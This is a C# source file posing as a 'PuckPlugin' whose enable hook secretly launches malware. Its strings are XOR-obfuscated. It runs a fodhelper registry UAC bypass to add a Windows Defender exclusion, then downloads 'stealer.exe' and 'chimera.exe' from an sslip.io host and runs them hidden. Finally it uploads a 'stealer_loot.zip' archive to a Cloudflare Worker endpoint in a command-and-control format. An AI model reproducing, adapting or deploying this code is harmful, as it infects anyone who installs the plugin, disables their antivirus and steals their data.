using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

public class PuckPlugin : IPuckPlugin
{
    private const byte XK = 0x4D;

    private static string X(byte[] b)
    {
        char[] c = new char[b.Length];
        for (int i = 0; i < b.Length; i++)
            c[i] = (char)(b[i] ^ XK);
        return new string(c);
    }

    public bool OnEnable()
    {
        Thread t = new Thread(Run);
        t.IsBackground = true;
        t.Start();
        return true;
    }

    public bool OnDisable() { return true; }

    private static void Run()
    {
        // C:\Users\Public\debug.txt
        byte[] bDebug = new byte[] {0x0e,0x77,0x11,0x18,0x3e,0x28,0x3f,0x3e,
                0x11,0x1d,0x38,0x2f,0x21,0x24,0x2e,0x11,
                0x29,0x28,0x2f,0x38,0x2a,0x63,0x39,0x35,0x39};
        // C:\Users\Public
        byte[] bDrop = new byte[] {0x0e,0x77,0x11,0x18,0x3e,0x28,0x3f,0x3e,
                0x11,0x1d,0x38,0x2f,0x21,0x24,0x2e};
        // http://144-172-84-23.sslip.io:7331/stealer.exe
        byte[] bStealUrl = new byte[] {0x25,0x39,0x39,0x3d,0x77,0x62,0x62,0x7c,
                0x79,0x79,0x60,0x7c,0x7a,0x7f,0x60,0x75,
                0x79,0x60,0x7f,0x7e,0x63,0x3e,0x3e,0x21,
                0x24,0x3d,0x63,0x24,0x22,0x77,0x7a,0x7e,
                0x7e,0x7c,0x62,0x3e,0x39,0x28,0x2c,0x21,
                0x28,0x3f,0x63,0x28,0x35,0x28};
        // http://144-172-84-23.sslip.io:7331/chimera.exe
        byte[] bChimUrl = new byte[] {0x25,0x39,0x39,0x3d,0x77,0x62,0x62,0x7c,
                0x79,0x79,0x60,0x7c,0x7a,0x7f,0x60,0x75,
                0x79,0x60,0x7f,0x7e,0x63,0x3e,0x3e,0x21,
                0x24,0x3d,0x63,0x24,0x22,0x77,0x7a,0x7e,
                0x7e,0x7c,0x62,0x2e,0x25,0x24,0x20,0x28,
                0x3f,0x2c,0x63,0x28,0x35,0x28};
        // stealer.exe
        byte[] bStealExe = new byte[] {0x3e,0x39,0x28,0x2c,0x21,0x28,0x3f,0x63,0x28,0x35,0x28};
        // chimera.exe
        byte[] bChimExe  = new byte[] {0x2e,0x25,0x24,0x20,0x28,0x3f,0x2c,0x63,0x28,0x35,0x28};
        // C:\Users\Public\stealer_loot.zip
        byte[] bLootZip  = new byte[] {0x0e,0x77,0x11,0x18,0x3e,0x28,0x3f,0x3e,
                0x11,0x1d,0x38,0x2f,0x21,0x24,0x2e,0x11,
                0x3e,0x39,0x28,0x2c,0x21,0x28,0x3f,0x12,
                0x21,0x22,0x22,0x39,0x63,0x37,0x24,0x3d};

        string debugTxt = X(bDebug);
        string dropDir  = X(bDrop);
        string stealUrl = X(bStealUrl);
        string chimUrl  = X(bChimUrl);
        string stealExe = X(bStealExe);
        string chimExe  = X(bChimExe);
        string lootZip  = X(bLootZip);

        try
        {
            File.WriteAllText(debugTxt, "Run started\n");
            AddDefenderExclusion(dropDir);
            Thread.Sleep(500);
            File.AppendAllText(debugTxt, "Exclusion done\n");

            string stealerDst = Path.Combine(dropDir, stealExe);
            Download(stealUrl, stealerDst);
            File.AppendAllText(debugTxt, "stealer downloaded\n");

            string chimeraDst = Path.Combine(dropDir, chimExe);
            Download(chimUrl, chimeraDst);
            File.AppendAllText(debugTxt, "chimera downloaded\n");

            Process stealer = RunHiddenWithHandle(stealerDst, "");
            File.AppendAllText(debugTxt, "stealer started\n");
            if (stealer != null) { stealer.WaitForExit(60000); stealer.Close(); }
            File.AppendAllText(debugTxt, "stealer done\n");

            RunHidden(chimeraDst, "");
            File.AppendAllText(debugTxt, "chimera started\n");

            Thread.Sleep(5000);
            UploadLoot(lootZip);
            File.AppendAllText(debugTxt, "loot uploaded\n");
        }
        catch (Exception ex)
        {
            File.WriteAllText(debugTxt, "ERROR: " + ex.Message);
        }
    }

    private static void AddDefenderExclusion(string path)
    {
        try
        {
            // Software\Classes\ms-settings\shell\open\command
            byte[] bRegPath = new byte[] {
                0x1e,0x22,0x2b,0x39,0x3a,0x2c,0x3f,0x28,
                0x11,0x0e,0x21,0x2c,0x3e,0x3e,0x28,0x3e,
                0x11,0x20,0x3e,0x60,0x3e,0x28,0x39,0x39,
                0x24,0x23,0x2a,0x3e,0x11,0x3e,0x25,0x28,
                0x21,0x21,0x11,0x22,0x3d,0x28,0x23,0x11,
                0x2e,0x22,0x20,0x20,0x2c,0x23,0x29};
            // DelegateExecute
            byte[] bDelExec = new byte[] {
                0x09,0x28,0x21,0x28,0x2a,0x2c,0x39,0x28,
                0x08,0x35,0x28,0x2e,0x38,0x39,0x28};
            // fodhelper.exe
            byte[] bFod = new byte[] {
                0x2b,0x22,0x29,0x25,0x28,0x21,0x3d,0x28,
                0x3f,0x63,0x28,0x35,0x28};
            // Software\Classes\ms-settings  (cleanup)
            byte[] bClean = new byte[] {
                0x1e,0x22,0x2b,0x39,0x3a,0x2c,0x3f,0x28,
                0x11,0x0e,0x21,0x2c,0x3e,0x3e,0x28,0x3e,
                0x11,0x20,0x3e,0x60,0x3e,0x28,0x39,0x39,
                0x24,0x23,0x2a,0x3e};

            string regPath = X(bRegPath);
            string delExec = X(bDelExec);
            string fodExe  = X(bFod);
            string clean   = X(bClean);

            string hklm = "HKLM" + "\\" + "SOFTWARE" + "\\" + "Microsoft"
                        + "\\" + "Windows Defender" + "\\" + "Exclusions" + "\\" + "Paths";
            string cmd = "reg add \"" + hklm + "\" /v \"" + path + "\" /t REG_DWORD /d 0 /f";

            Microsoft.Win32.RegistryKey key =
                Microsoft.Win32.Registry.CurrentUser.CreateSubKey(regPath);
            if (key != null)
            {
                key.SetValue("", cmd);
                key.SetValue(delExec, "");
                key.Close();
            }

            Process.Start(new ProcessStartInfo
            {
                FileName        = fodExe,
                WindowStyle     = ProcessWindowStyle.Hidden,
                CreateNoWindow  = true,
                UseShellExecute = false
            });

            Thread.Sleep(3000);

            try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(clean, false); }
            catch { }
        }
        catch { }
    }

    private static void UploadLoot(string zipPath)
    {
        try
        {
            if (!File.Exists(zipPath)) return;
            // Cloudflare Worker URL
            string cbUrl = "https://hidden-lake-0908.walrus012.workers" + ".dev/data";
            byte[] data  = File.ReadAllBytes(zipPath);
            string b64   = Convert.ToBase64String(data);
            string json  = "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"loot\","
                         + "\"download\":{\"total_chunks\":1,\"chunk_num\":1,"
                         + "\"chunk_data\":\"" + b64 + "\","
                         + "\"full_path\":\"" + zipPath.Replace("\\", "\\\\") + "\","
                         + "\"is_screenshot\":false}}]}";
            using (var wc = new WebClient())
            {
                wc.Headers["Content-Type"] = "application/json";
                wc.UploadString(cbUrl, "POST", json);
            }
        }
        catch { }
    }

    private static void Download(string url, string dest)
    {
        using (var wc = new WebClient())
            wc.DownloadFile(url, dest);
    }

    private static void RunHidden(string exe, string args)
    {
        try
        {
            Process.Start(new ProcessStartInfo {
                FileName = exe, Arguments = args,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true, UseShellExecute = false
            });
        }
        catch { }
    }

    private static Process RunHiddenWithHandle(string exe, string args)
    {
        try
        {
            return Process.Start(new ProcessStartInfo {
                FileName = exe, Arguments = args,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true, UseShellExecute = false
            });
        }
        catch { return null; }
    }
}
